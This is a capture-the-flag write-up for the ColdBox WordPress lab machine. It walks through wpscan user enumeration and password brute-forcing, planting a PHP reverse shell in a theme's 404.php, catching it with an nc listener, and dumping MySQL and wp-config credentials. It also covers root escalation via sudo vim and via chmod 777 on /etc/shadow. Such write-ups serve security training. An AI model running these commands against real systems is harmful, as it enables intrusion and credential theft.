# 17 - ColdBox (wordpress)

### Enumeration

After enumeration with nmap:

```bash
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine
4512/tcp open  unknown syn-ack
```

Since its a wordpress site, and we navigate to "/wp-login.php" and get a login page, now we just need valid credentials.

#### Enumerating Valid Users with \[wpscan]

```bash
wpscan --url http://10.10.55.211/ --enumerate u
```

<figure><img src=".gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

#### Enumerating their Passwords

Now we bruteforce for a correct password.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# save the 3 usernames in a users.txt file.
wpscan --url http://10.10.55.211/ --passwords /usr/share/wordlists/rockyou.txt --usernames users.txt
```
{% endcode %}

<figure><img src=".gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

And we got password for "c0ldd", and we logged in successfully.

### Initial Access

We navigate to "Appearance", "Editior" then in the "Twenty fifteen" theme menu, select "404.php", we will replace this with a php reverse shell.

<figure><img src=".gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

After that we set up a listener `rlwrap nc -nvlp 9000`&#x20;

Then navigate to: "[http://10.10.55.211/wp-content/themes/twentyfifteen/404.php](http://10.10.55.211/wp-content/themes/twentyfifteen/404.php)"

Stabilize the shell with: `python3 -c 'import pty;pty.spawn("/bin/bash")'` .

We are in now, going back a bit to the `/var/www/html` dir, we see a lot of files/dirs. The one of interest is the `wp-config.php` file because it usually contains MySQL creds (sometimes though). When we cat the contents, we saw MySQL creds for the "c0ldd" user.

<figure><img src=".gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

Tried authenticating to MySQL with the creds and it worked.

`mysql -h 127.0.0.1 -u c0ldd -p` .

<figure><img src=".gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

```
show databases; # to display all the dbs.
use colddbox; # select a db.
show tables; # display tables for the selected db.
select * from wp-users # dump the info.
```

<figure><img src=".gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

And we got some credentials we can crack, but meanwhile i tried the MySQL creds for "c0ldd" for ssh on port 4512 and it worked.

<figure><img src=".gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

Immediately i tried `sudo -l` and found some binaries user c0ldd could execute with sudo privileges. Went to gtfobins and tried "vim" and got root.

### Alternative ways to priv esc

There are 2 other binaries we could leverage to do priv esc:

chmod and ftp.

#### Using \[chmod]

Obviously we could use "chmod" to give ourself permission to access the /etc/shadow file and put our own custom password hash for root account and login as root user.

```
sudo /bin/chmod 777 /etc/shadow # give ourself permission to modify the file.
nano /etc/shadow # replace the root password hash with "c0ldd" pass hash :)
su root # use c0ldd password.
# and we are root.
```

#### Using \[ftp]

<figure><img src=".gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

Room Done..
